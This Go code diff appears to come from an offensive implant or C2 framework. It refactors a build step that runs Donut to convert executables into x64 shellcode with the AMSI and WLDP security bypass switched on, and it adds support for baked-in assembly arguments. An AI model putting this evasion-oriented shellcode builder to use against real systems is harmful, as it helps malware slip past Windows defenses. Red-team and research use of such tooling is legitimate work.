@@ -815,6 +815,12 @@ func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
 // Tries the system donut binary first (handles modern Go binaries/relocations correctly),
 // falls back to go-donut if not found.
 func BuildRAW(exePath, outDir string) (string, error) {
+	return buildRAWWithArgs(exePath, outDir, "")
+}
+
+// buildRAWWithArgs is like BuildRAW but also bakes asmArgs into the shellcode
+// via Donut's -p flag (passed verbatim to the assembly entry point at runtime).
+func buildRAWWithArgs(exePath, outDir, asmArgs string) (string, error) {
 	root := projectRoot()
 	outDir = absDir(root, outDir)
 	os.MkdirAll(outDir, 0755)
@@ -828,8 +834,11 @@ func BuildRAW(exePath, outDir string) (string, error) {
 	// relocations in large modern Go PE files that go-donut misses.
 	if donutBin, err := findDonut(); err == nil {
 		// -f 1 = raw shellcode, -a 2 = x64, -b 3 = bypass AMSI+WLDP
-		cmd := exec.Command(donutBin, "-f", "1", "-a", "2", "-b", "3",
-			"-i", exePath, "-o", outPath)
+		argv := []string{"-f", "1", "-a", "2", "-b", "3", "-i", exePath, "-o", outPath}
+		if asmArgs != "" {
+			argv = append(argv, "-p", asmArgs)
+		}
+		cmd := exec.Command(donutBin, argv...)
 		cmd.Dir = root
 		out, err := cmd.CombinedOutput()
 		if err != nil {
@@ -847,9 +856,13 @@ func BuildRAW(exePath, outDir string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	cmd := exec.Command(gobin, "run",
+	argv := []string{"run",
 		"github.com/Binject/go-donut@v0.0.0-20220908180326-fcdcc35d591c",
-		"-i", exePath, "-o", outPath, "-f", "1", "-a", "x64")
+		"-i", exePath, "-o", outPath, "-f", "1", "-a", "x64"}
+	if asmArgs != "" {
+		argv = append(argv, "-p", asmArgs)
+	}
+	cmd := exec.Command(gobin, argv...)
 	cmd.Dir = root
 	if out, err := cmd.CombinedOutput(); err != nil {
 		return "", fmt.Errorf("go-donut failed: %v\n%s", err, out)
